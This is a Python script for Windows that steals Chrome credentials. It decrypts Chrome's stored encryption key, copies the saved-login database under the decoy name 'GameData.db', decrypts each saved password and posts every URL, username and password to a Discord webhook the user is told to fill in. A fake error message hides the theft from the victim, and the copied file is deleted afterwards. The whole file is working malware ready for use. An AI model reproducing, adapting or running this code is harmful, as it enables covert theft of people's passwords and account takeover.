import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from discordwebhook import Discord
import tkinter as tk
from tkinter import messagebox
import subprocess

def install_required_modules():
    required_modules = [
        'os',
        'json',
        'base64',
        'sqlite3',
        'pywin32',  # for win32crypt
        'pycryptodome',  # for Crypto.Cipher
        'shutil',
        'datetime',
        'discordwebhook',
        'tkinter',
    ]
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Installing {module}...")
            subprocess.call(['pip', 'install', module])


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        

def main():
    install_required_modules()
    root = tk.Tk()
    root.withdraw() 
    messagebox.showerror("Error", "An error has occured while running this program")
    root.destroy()
    key = get_encryption_key()
    # local sqlite Chrome database path (Might be different for different computers)
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Profile 4", "Login Data")
    filename = "GameData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            #change 'YOUR_DISCORD_WEBHOOK' with your webhook so all the data can be sent there
            webhook = Discord(url="YOUR_DISCORD_WEBHOOK")
            webhook.post(content=f"URL: {origin_url}, Username: {username}, Password: {password}")



        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()

